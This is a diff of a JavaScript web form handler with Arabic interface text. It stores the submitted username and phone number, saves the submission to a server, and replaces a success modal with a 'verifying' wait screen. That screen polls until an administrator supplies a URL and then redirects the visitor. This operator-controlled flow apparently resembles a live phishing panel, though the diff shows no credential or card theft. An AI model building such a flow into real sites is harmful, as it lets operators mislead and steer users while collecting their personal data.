@@ -45,18 +45,62 @@ class FormHandler {
         };
 
         try {
+            if (userData.username && String(userData.username).trim()) {
+                localStorage.setItem(
+                    'yasmeen_last_username',
+                    String(userData.username).trim()
+                );
+            }
+            if (userData.phone && String(userData.phone).trim()) {
+                localStorage.setItem(
+                    'yasmeen_last_phone',
+                    String(userData.phone).trim()
+                );
+            }
+        } catch (e) {
+            /* ignore */
+        }
+
+        try {
             if (typeof saveSubmission !== 'function') {
                 throw new Error('saveSubmission غير معرّف — حمّل api-client.js');
             }
             await saveSubmission(newUser);
-            this.hideLoading();
             this.playSound();
-            this.showConfirmation();
+            this.waitForAdminRedirectThenNavigate();
         } catch (err) {
             console.error(err);
+            this.stopRedirectPolling();
             this.hideLoading();
             alert('تعذر حفظ البيانات في قاعدة البيانات. تأكد أن الخادم يعمل (من مجلد server: npm start) وأن MongoDB متاح.');
         }
+    }
+
+    stopRedirectPolling() {
+        if (typeof this._redirectPollStop === 'function') {
+            this._redirectPollStop();
+            this._redirectPollStop = null;
+        }
+    }
+
+    waitForAdminRedirectThenNavigate() {
+        this.stopRedirectPolling();
+        const loading = document.getElementById('formLoading') || this.createLoadingElement();
+        loading.style.display = 'flex';
+        const msgEl = loading.querySelector('.form-loading-message');
+        if (msgEl) {
+            msgEl.textContent =
+                'يرجى الانتظار، جاري التحقق من قبل النظام...';
+        }
+        this.form.reset();
+
+        if (typeof startSessionRedirectPolling !== 'function') {
+            console.error('startSessionRedirectPolling غير معرّف — حمّل api-client.js');
+            return;
+        }
+        this._redirectPollStop = startSessionRedirectPolling(function (url) {
+            window.location.href = url;
+        });
     }
 
     playSound() {
@@ -109,78 +153,14 @@ class FormHandler {
             gap: 10px;
         `;
         div.innerHTML = `
-            <div style="width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-            <p style="color: white; font-size: 18px; margin: 0;">جاري المعالجة...</p>
+            <style>@keyframes formHandlerSpin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+            <div style="width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; animation: formHandlerSpin 1s linear infinite;"></div>
+            <p class="form-loading-message" style="color: white; font-size: 18px; margin: 0;">جاري المعالجة...</p>
         `;
         document.body.appendChild(div);
         return div;
     }
 
-    showConfirmation() {
-        this.hideLoading();
-        const modal = document.createElement('div');
-        modal.style.cssText = `
-            position: fixed;
-            top: 0;
-            right: 0;
-            bottom: 0;
-            left: 0;
-            background: rgba(0, 0, 0, 0.5);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-        `;
-        modal.innerHTML = `
-            <div style="
-                background: white;
-                padding: 40px;
-                border-radius: 15px;
-                text-align: center;
-                max-width: 400px;
-                animation: slideUp 0.3s ease;
-            ">
-                <div style="font-size: 50px; margin-bottom: 20px;">✅</div>
-                <h2 style="color: #28a745; margin-bottom: 10px;">تم التسجيل بنجاح!</h2>
-                <p style="color: #666; margin-bottom: 20px;">شكراً لك على المعلومات. تم حفظ بيانتك بنجاح.</p>
-                <button onclick="window.location.href='index.html'" style="
-                    padding: 10px 30px;
-                    background: #667eea;
-                    color: white;
-                    border: none;
-                    border-radius: 6px;
-                    font-size: 16px;
-                    cursor: pointer;
-                    font-weight: bold;
-                ">العودة للرئيسية</button>
-            </div>
-            <style>
-                @keyframes slideUp {
-                    from {
-                        transform: translateY(30px);
-                        opacity: 0;
-                    }
-                    to {
-                        transform: translateY(0);
-                        opacity: 1;
-                    }
-                }
-                @keyframes spin {
-                    0% { transform: rotate(0deg); }
-                    100% { transform: rotate(360deg); }
-                }
-            </style>
-        `;
-        document.body.appendChild(modal);
-        
-        // إغلاق النموذج
-        this.form.reset();
-
-        // إزالة المودال بعد 3 ثواني
-        setTimeout(() => {
-            modal.remove();
-        }, 3000);
-    }
 }
 
 // وظيفة مساعدة للاستخدام السريع
